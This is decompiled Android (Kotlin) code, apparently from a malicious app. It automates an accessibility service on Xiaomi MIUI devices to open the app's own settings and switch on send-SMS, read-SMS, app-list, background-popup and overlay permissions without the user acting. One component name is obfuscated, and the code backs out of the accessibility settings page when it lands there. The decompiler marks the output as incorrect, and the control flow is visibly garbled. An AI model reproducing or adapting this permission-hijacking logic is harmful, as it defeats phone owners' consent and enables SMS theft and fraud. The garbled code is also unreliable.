    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:74:0x0613 -> B:75:0x0615). Please report as a decompilation issue!!! */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212256b5(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$1;
        List listM213306g5;
        int i;
        C0367a4 c0367a4;
        C0367a4 c0367a42;
        String str;
        String str2;
        String str3;
        String str4;
        List listM213306g52;
        List listM213306g53;
        List list;
        int i2;
        int i3;
        int i4;
        int i5;
        int i6;
        AccessibilityNodeInfo rootInActiveWindow;
        boolean z;
        int i7;
        Object obj;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$12;
        C0367a4 c0367a43;
        List listM213306g54;
        int i8;
        int i9;
        int i10;
        List list2;
        int i11;
        String str5;
        String str6;
        List list3;
        Object obj2;
        int i12;
        int i13;
        int i14;
        C0367a4 c0367a44;
        C0367a4 c0367a45;
        int i15;
        Object obj3;
        long jCurrentTimeMillis;
        List list4;
        C0367a4 c0367a46;
        int i16;
        Object objM212291f6;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$13;
        C0367a4 c0367a47;
        Object objM212236a4;
        long j;
        List list5;
        C0367a4 c0367a48;
        int i17;
        Object obj4;
        int i18;
        int i19;
        C0367a4 c0367a49;
        int i20;
        Object obj5;
        int i21;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$14;
        C0367a4 c0367a410;
        C0367a4 c0367a411;
        Object objM212291f62;
        Map mapM213614f9;
        LinkedHashSet linkedHashSet;
        int i22;
        int i23;
        int i24;
        int i25;
        int i26;
        Iterator it;
        CoroutineSingletons coroutineSingletons;
        String str7;
        int i27;
        String str8;
        int i28;
        int i29;
        int i30;
        String str9;
        Iterator it2;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$15;
        int i31;
        int i32;
        String str10;
        C0367a4 c0367a412;
        int i33;
        int i34;
        Object objM212263c2;
        String str11;
        LinkedHashSet linkedHashSet2;
        String str12;
        Map map;
        int i35;
        int i36;
        int i37;
        int i38;
        int i39;
        String str13;
        C0367a4 c0367a413;
        CoroutineSingletons coroutineSingletons2;
        int i40;
        String str14;
        int i41;
        Iterator it3;
        LinkedHashSet linkedHashSet3;
        Map map2;
        C0367a4 c0367a414;
        Iterator it4;
        int i42;
        int i43;
        int i44;
        int i45;
        Object obj6;
        int i46;
        int i47;
        int i48;
        Map map3;
        int i49;
        CoroutineSingletons coroutineSingletons3;
        String str15;
        int i50;
        int i51;
        String str16;
        Iterator it5;
        int i52;
        int i53;
        C0367a4 c0367a415;
        int i54;
        Iterator it6;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$16;
        LinkedHashSet linkedHashSet4;
        int i55;
        int i56;
        int i57;
        LinkedHashSet linkedHashSet5;
        C0367a4 c0367a416;
        CoroutineSingletons coroutineSingletons4;
        int i58;
        int i59;
        int i60;
        int i61;
        int i62;
        int i63;
        int i64;
        Map map4;
        C0367a4 c0367a417;
        Iterator it7;
        String str17;
        Iterator it8;
        C0367a4 c0367a418;
        MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$17;
        Map map5;
        int i65;
        LinkedHashSet linkedHashSet6;
        AccessibilityNodeInfo rootInActiveWindow2;
        Iterator it9;
        boolean z2;
        boolean z3;
        boolean z4;
        boolean z5;
        LinkedHashSet linkedHashSet7;
        int i66;
        Iterator it10;
        int i67;
        int i68;
        int i69;
        LinkedHashSet linkedHashSet8;
        C0367a4 c0367a419;
        String str18;
        String str19;
        int i70;
        int i71;
        LinkedHashSet linkedHashSet9;
        int i72;
        int i73;
        String str20;
        Iterator it11;
        C0367a4 c0367a420;
        ArrayList arrayList;
        if (continuationImpl instanceof MiuiSteps$executeBackgroundPopupFlow$1) {
            miuiSteps$executeBackgroundPopupFlow$1 = (MiuiSteps$executeBackgroundPopupFlow$1) continuationImpl;
            int i74 = miuiSteps$executeBackgroundPopupFlow$1.f54363b9;
            if ((i74 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = i74 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeBackgroundPopupFlow$1 = new MiuiSteps$executeBackgroundPopupFlow$1(this, continuationImpl);
            }
        }
        Object obj7 = miuiSteps$executeBackgroundPopupFlow$1.f54361b7;
        CoroutineSingletons coroutineSingletons5 = CoroutineSingletons.f57606a0;
        int i75 = 4;
        String str21 = "│ │ │ │ ✅ 全部7个权限已完成!";
        String str22 = "/";
        String str23 = ")";
        String str24 = "│ │ │ │";
        switch (miuiSteps$executeBackgroundPopupFlow$1.f54363b9) {
            case 0:
                kg1.m213544f4(obj7);
                m212274d8("│ │ │");
                m212274d8("│ │ │ ┌─ 权限管理（后台弹出/悬浮窗）─────────────────────────");
                m212274d8("│ │ │ │ 📋 目标: 依次设置四个权限");
                m212274d8("│ │ │ │   1. 发送短信 → 允许");
                m212274d8("│ │ │ │   2. 后台弹出界面 → 允许");
                m212274d8("│ │ │ │   3. 通知类短信 → 允许");
                m212274d8("│ │ │ │   4. 悬浮窗 → 允许");
                m212274d8("│ │ │ │");
                listM213306g5 = AbstractC0716jf.m213306g5("短信", "电话", "联系人", "发送短信", "后台弹出", "SMS", "Phone", "Contacts", "Send SMS", "Background popup");
                i = Build.VERSION.SDK_INT <= 28 ? 1 : 0;
                if (i == 0) {
                    m212274d8("│ │ │ │ 🔙 先返回到桌面...");
                    this.f55106a0.performGlobalAction(2);
                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = this;
                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = listM213306g5;
                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i;
                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 1;
                    if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                        c0367a4 = this;
                        c0367a4.m212274d8("│ │ │ │ 🔹 [步骤1] 打开应用详情");
                        listM213306g52 = AbstractC0716jf.m213306g5("权限管理", "通知管理", "存储占用", "流量使用情况", "自启动", "电量使用详情", "Permissions", "Notifications", "Storage", "Data usage", "Auto-start", "Battery usage");
                        listM213306g53 = AbstractC0716jf.m213306g5("无障碍服务", "快捷方式", "选项");
                        list = listM213306g5;
                        c0367a42 = c0367a4;
                        i2 = 0;
                        i3 = 1;
                        i4 = i;
                        if (i3 >= i75) {
                            c0367a42.m212274d8("│ │ │ │   🔄 尝试 " + i3 + "/3");
                            Context context = c0367a42.f55107a1;
                            c0367a42.m212274d8("[应用详情] 🔹 优先使用安全中心（带自启动开关）");
                            boolean z6 = true;
                            str = str21;
                            try {
                            } catch (Exception e) {
                                e = e;
                                str3 = str22;
                                break;
                            }
                            Intent intent = new Intent();
                            str3 = str22;
                            str4 = str23;
                            intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.miui.appmanager.ApplicationsDetailsActivity"));
                            intent.putExtra("package_name", context.getPackageName());
                            intent.setFlags(1350631424);
                            context.startActivity(intent);
                            c0367a42.m212274d8("[应用详情] ✅ 安全中心应用详情已打开（带自启动）");
                            if (z6) {
                                str2 = str24;
                                c0367a42.m212274d8("│ │ │ │   ⏳ 打开应用详情成功，延时1.5秒...");
                                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i2;
                                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i3;
                                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 3;
                                if (b81.m210571b1(1500L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                    i5 = i3;
                                    i6 = i2;
                                    c0367a42.m212274d8("│ │ │ │   ⏳ 等待页面加载稳定...");
                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i6;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i5;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 4;
                                    miuiSteps$executeBackgroundPopupFlow$12 = miuiSteps$executeBackgroundPopupFlow$1;
                                    c0367a43 = c0367a42;
                                    if (c0367a43.m212294f9(2, 100L, 2000L, miuiSteps$executeBackgroundPopupFlow$12) != coroutineSingletons5) {
                                        c0367a42 = c0367a43;
                                        miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$12;
                                        rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                                        if (rootInActiveWindow == null) {
                                            Iterator it12 = listM213306g53.iterator();
                                            z = false;
                                            while (it12.hasNext()) {
                                                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it12.next());
                                                if (listFindAccessibilityNodeInfosByText != null && (!listFindAccessibilityNodeInfosByText.isEmpty())) {
                                                    Iterator<AccessibilityNodeInfo> it13 = listFindAccessibilityNodeInfosByText.iterator();
                                                    while (true) {
                                                        if (it13.hasNext()) {
                                                            AccessibilityNodeInfo next = it13.next();
                                                            Iterator<AccessibilityNodeInfo> it14 = it13;
                                                            if (AbstractC0003a2.m24a5(next).top < c0367a42.m212268d2() * 0.3f) {
                                                                c0367a42.m212274d8("│ │ │ │   ⚠️ 检测到无障碍服务页面: " + ((Object) next.getText()));
                                                                z = true;
                                                            } else {
                                                                it13 = it14;
                                                            }
                                                        }
                                                    }
                                                }
                                                if (z) {
                                                    rootInActiveWindow.recycle();
                                                }
                                            }
                                            rootInActiveWindow.recycle();
                                        } else {
                                            z = false;
                                        }
                                        if (!z) {
                                            c0367a42.m212274d8("│ │ │ │   🔙 在无障碍页面，按返回键退出...");
                                            c0367a42.f55106a0.performGlobalAction(1);
                                            miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i6;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i5;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 5;
                                            break;
                                        } else {
                                            miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i6;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i5;
                                            miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 6;
                                            Object objM212291f63 = c0367a42.m212291f6(listM213306g52, 2000L, miuiSteps$executeBackgroundPopupFlow$1);
                                            if (objM212291f63 != coroutineSingletons5) {
                                                i7 = i5;
                                                obj = objM212291f63;
                                                if (((Boolean) obj).booleanValue()) {
                                                    c0367a42.m212274d8("│ │ │ │   ⚠️ 页面验证失败，可能还在其他页面");
                                                    c0367a42.f55106a0.performGlobalAction(1);
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i6;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i7;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 7;
                                                    if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                                        i5 = i7;
                                                        i2 = i6;
                                                        i3 = i5 + 1;
                                                        str24 = str2;
                                                        str21 = str;
                                                        str23 = str4;
                                                        str22 = str3;
                                                        i75 = 4;
                                                        if (i3 >= i75) {
                                                        }
                                                    }
                                                } else {
                                                    c0367a42.m212274d8("│ │ │ │   ✅ 应用详情页面验证成功");
                                                    i2 = 1;
                                                    i = i4;
                                                    listM213306g5 = list;
                                                    if (i2 == 0) {
                                                    }
                                                    c0367a42.m212274d8(str2);
                                                    c0367a42.m212274d8("│ │ │ │ 🔹 [步骤2] 滚动并点击「权限管理」");
                                                    listM213306g54 = AbstractC0716jf.m213306g5("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions");
                                                    i8 = 1;
                                                    i9 = 2;
                                                    str6 = str4;
                                                    str5 = str3;
                                                    c0367a42.m212274d8(AbstractC0003a2.m31b2("│ │ │ │   🔄 尝试点击权限管理 (", i8, str5, i9, str6));
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = listM213306g5;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g54;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i9;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 8;
                                                    objM212236a4 = m212236a4(c0367a42, "权限管理", miuiSteps$executeBackgroundPopupFlow$1);
                                                    if (objM212236a4 != coroutineSingletons5) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            } else {
                                c0367a42.m212274d8("│ │ │ │   ❌ 打开应用详情失败");
                                c0367a42.f55106a0.performGlobalAction(1);
                                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list;
                                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g52;
                                miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = listM213306g53;
                                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i4;
                                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i2;
                                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i3;
                                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 2;
                                str2 = str24;
                                if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                    i5 = i3;
                                    i6 = i2;
                                    i2 = i6;
                                    i3 = i5 + 1;
                                    str24 = str2;
                                    str21 = str;
                                    str23 = str4;
                                    str22 = str3;
                                    i75 = 4;
                                    if (i3 >= i75) {
                                        str = str21;
                                        str2 = str24;
                                        str3 = str22;
                                        str4 = str23;
                                        i = i4;
                                        listM213306g5 = list;
                                        if (i2 == 0) {
                                            c0367a42.m212274d8("│ │ │ │   ⚠️ 3次尝试后仍未打开应用详情，继续执行...");
                                        }
                                        c0367a42.m212274d8(str2);
                                        c0367a42.m212274d8("│ │ │ │ 🔹 [步骤2] 滚动并点击「权限管理」");
                                        listM213306g54 = AbstractC0716jf.m213306g5("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions");
                                        i8 = 1;
                                        i9 = 2;
                                        str6 = str4;
                                        str5 = str3;
                                        c0367a42.m212274d8(AbstractC0003a2.m31b2("│ │ │ │   🔄 尝试点击权限管理 (", i8, str5, i9, str6));
                                        miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = listM213306g5;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g54;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i9;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 8;
                                        objM212236a4 = m212236a4(c0367a42, "权限管理", miuiSteps$executeBackgroundPopupFlow$1);
                                        if (objM212236a4 != coroutineSingletons5) {
                                        }
                                    }
                                }
                            }
                        }
                    }
                    return coroutineSingletons5;
                }
                m212274d8("│ │ │ │ 📱 [Android 9及以下] 通知返回后已在应用详情，跳过返回桌面和打开应用详情");
                c0367a42 = this;
                str = "│ │ │ │ ✅ 全部7个权限已完成!";
                str2 = "│ │ │ │";
                str3 = "/";
                str4 = ")";
                c0367a42.m212274d8(str2);
                c0367a42.m212274d8("│ │ │ │ 🔹 [步骤2] 滚动并点击「权限管理」");
                listM213306g54 = AbstractC0716jf.m213306g5("其他权限", "应用权限", "单项权限", "权限", "Other permissions", "App permissions", "Permissions");
                i8 = 1;
                i9 = 2;
                str6 = str4;
                str5 = str3;
                c0367a42.m212274d8(AbstractC0003a2.m31b2("│ │ │ │   🔄 尝试点击权限管理 (", i8, str5, i9, str6));
                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = listM213306g5;
                miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g54;
                miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i;
                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i9;
                miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 8;
                objM212236a4 = m212236a4(c0367a42, "权限管理", miuiSteps$executeBackgroundPopupFlow$1);
                if (objM212236a4 != coroutineSingletons5) {
                    List list6 = listM213306g54;
                    i11 = i;
                    obj2 = objM212236a4;
                    list3 = listM213306g5;
                    i10 = i9;
                    list2 = list6;
                    if (!((Boolean) obj2).booleanValue()) {
                        c0367a42.m212274d8("│ │ │ │   ⚠️ 未找到「权限管理」");
                        if (i8 < i10) {
                            miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                            miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list3;
                            miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = list2;
                            miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i11;
                            miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i10;
                            miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                            miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 9;
                            if (b81.m210571b1(300L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                i12 = i8;
                                i13 = i11;
                                listM213306g54 = list2;
                                i9 = i10;
                                listM213306g5 = list3;
                                if (i12 == i9) {
                                    int i76 = i13;
                                    i8 = i12 + 1;
                                    i = i76;
                                    str3 = str5;
                                    str4 = str6;
                                    str6 = str4;
                                    str5 = str3;
                                    c0367a42.m212274d8(AbstractC0003a2.m31b2("│ │ │ │   🔄 尝试点击权限管理 (", i8, str5, i9, str6));
                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a42;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = listM213306g5;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = listM213306g54;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i9;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54353a9 = i8;
                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 8;
                                    objM212236a4 = m212236a4(c0367a42, "权限管理", miuiSteps$executeBackgroundPopupFlow$1);
                                    if (objM212236a4 != coroutineSingletons5) {
                                    }
                                } else {
                                    list3 = listM213306g5;
                                    c0367a45 = c0367a42;
                                    c0367a45.m212274d8(str2);
                                    c0367a45.m212274d8("│ │ │ │ 🔹 [步骤3] 查找「其他权限」入口（等待2秒）");
                                    jCurrentTimeMillis = System.currentTimeMillis();
                                    list4 = list3;
                                    c0367a46 = c0367a45;
                                    i16 = 0;
                                    if (System.currentTimeMillis() - jCurrentTimeMillis >= 2000) {
                                        miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a46;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list4;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = null;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i13;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i16;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54360b6 = jCurrentTimeMillis;
                                        miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 13;
                                        Object objM212235a2 = m212235a2(c0367a46, "其他权限", miuiSteps$executeBackgroundPopupFlow$1);
                                        if (objM212235a2 != coroutineSingletons5) {
                                            C0367a4 c0367a421 = c0367a46;
                                            list5 = list4;
                                            i17 = i13;
                                            j = jCurrentTimeMillis;
                                            obj4 = objM212235a2;
                                            c0367a48 = c0367a421;
                                            if (((Boolean) obj4).booleanValue()) {
                                                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a48;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list5;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i17;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i16;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54360b6 = j;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 16;
                                                if (b81.m210571b1(200L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                                    i13 = i17;
                                                    jCurrentTimeMillis = j;
                                                    list4 = list5;
                                                    c0367a46 = c0367a48;
                                                    if (System.currentTimeMillis() - jCurrentTimeMillis >= 2000) {
                                                        i21 = i13;
                                                        if (i16 == 0) {
                                                        }
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a46;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i21;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 17;
                                                        miuiSteps$executeBackgroundPopupFlow$14 = miuiSteps$executeBackgroundPopupFlow$1;
                                                        c0367a410 = c0367a46;
                                                        if (c0367a410.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$14) != coroutineSingletons5) {
                                                        }
                                                    }
                                                }
                                            } else {
                                                c0367a48.m212274d8("│ │ │ │   ✅ 找到并点击「其他权限」，进入子页面");
                                                miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a48;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = list5;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i17;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = 1;
                                                miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 14;
                                                if (c0367a48.m212294f9(2, 100L, 2000L, miuiSteps$executeBackgroundPopupFlow$1) != coroutineSingletons5) {
                                                    i19 = i17;
                                                    c0367a49 = c0367a48;
                                                    i18 = 1;
                                                    c0367a49.m212274d8("│ │ │ │   🔍 验证子页面（查找短信/电话/联系人文本）...");
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a49;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = null;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i19;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54352a8 = i18;
                                                    miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 15;
                                                    objM212291f62 = c0367a49.m212291f6(list5, 2000L, miuiSteps$executeBackgroundPopupFlow$1);
                                                    if (objM212291f62 != coroutineSingletons5) {
                                                        i20 = i18;
                                                        obj5 = objM212291f62;
                                                        if (((Boolean) obj5).booleanValue()) {
                                                            c0367a49.m212274d8("│ │ │ │   ⚠️ 子页面验证失败，继续执行...");
                                                        } else {
                                                            c0367a49.m212274d8("│ │ │ │   ✅ 子页面验证成功");
                                                        }
                                                        i16 = i20;
                                                        i21 = i19;
                                                        c0367a46 = c0367a49;
                                                        if (i16 == 0) {
                                                            c0367a46.m212274d8("│ │ │ │   ⚠️ 2秒内未找到「其他权限」，直接在当前页面查找权限");
                                                        }
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54344a0 = c0367a46;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54345a1 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54346a2 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54347a3 = null;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54351a7 = i21;
                                                        miuiSteps$executeBackgroundPopupFlow$1.f54363b9 = 17;
                                                        miuiSteps$executeBackgroundPopupFlow$14 = miuiSteps$executeBackgroundPopupFlow$1;
                                                        c0367a410 = c0367a46;
                                                        if (c0367a410.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$14) != coroutineSingletons5) {
                                                            c0367a411 = c0367a410;
                                                            miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$14;
                                                            mapM213614f9 = AbstractC0770a1.m213614f9(cq0.m212497e0("发送短信", AbstractC1117qo.m214451e7("发送短信")), cq0.m212497e0("读取短信", AbstractC0716jf.m213306g5("读取短信与彩信", "读取短信")), cq0.m212497e0("读取应用列表", AbstractC0716jf.m213306g5("读取应用列表", "获取应用列表")), cq0.m212497e0("后台弹出界面", AbstractC1117qo.m214451e7("后台弹出界面")), cq0.m212497e0("通知类短信", AbstractC1117qo.m214451e7("通知类短信")), cq0.m212497e0("显示悬浮窗", AbstractC0716jf.m213306g5("显示悬浮窗", "悬浮窗")));
                                                            linkedHashSet = new LinkedHashSet();
                                                            c0367a411.m212274d8("│ │ │ │ 📋 要查找的权限（7个唯一权限）: " + AbstractC0715je.m213303j0(mapM213614f9.keySet()));
                                                            i22 = 0;
                                                            i23 = 0;
                                                            i24 = 1;
                                                            i25 = 3;
                                                            i26 = 3;
                                                            if (linkedHashSet.size() >= 7) {
                                                                c0367a411.m212274d8(str);
                                                                CoroutineSingletons coroutineSingletons6 = coroutineSingletons5;
                                                                map5 = mapM213614f9;
                                                                coroutineSingletons4 = coroutineSingletons6;
                                                                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                                                                str19 = str2;
                                                                c0367a420 = c0367a411;
                                                                c0367a420.m212274d8(str19);
                                                                c0367a420.m212274d8("│ │ │ │ 📊 权限设置结果: " + linkedHashSet.size() + "/7 (7个唯一权限)");
                                                                StringBuilder sb = new StringBuilder("│ │ │ │   完成的权限组: ");
                                                                sb.append(linkedHashSet);
                                                                c0367a420.m212274d8(sb.toString());
                                                                Set setKeySet = map5.keySet();
                                                                arrayList = new ArrayList();
                                                                for (Object obj8 : setKeySet) {
                                                                    if (!linkedHashSet.contains((String) obj8)) {
                                                                        arrayList.add(obj8);
                                                                    }
                                                                }
                                                                if (!arrayList.isEmpty()) {
                                                                    c0367a420.m212274d8("│ │ │ │   未完成的权限组: " + arrayList);
                                                                }
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54344a0 = c0367a420;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54345a1 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54346a2 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54347a3 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54348a4 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54349a5 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54350a6 = null;
                                                                miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 28;
                                                                if (b81.m210571b1(150L, miuiSteps$executeBackgroundPopupFlow$15) == coroutineSingletons4) {
                                                                    return coroutineSingletons4;
                                                                }
                                                                c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.BACKGROUND_POPUP);
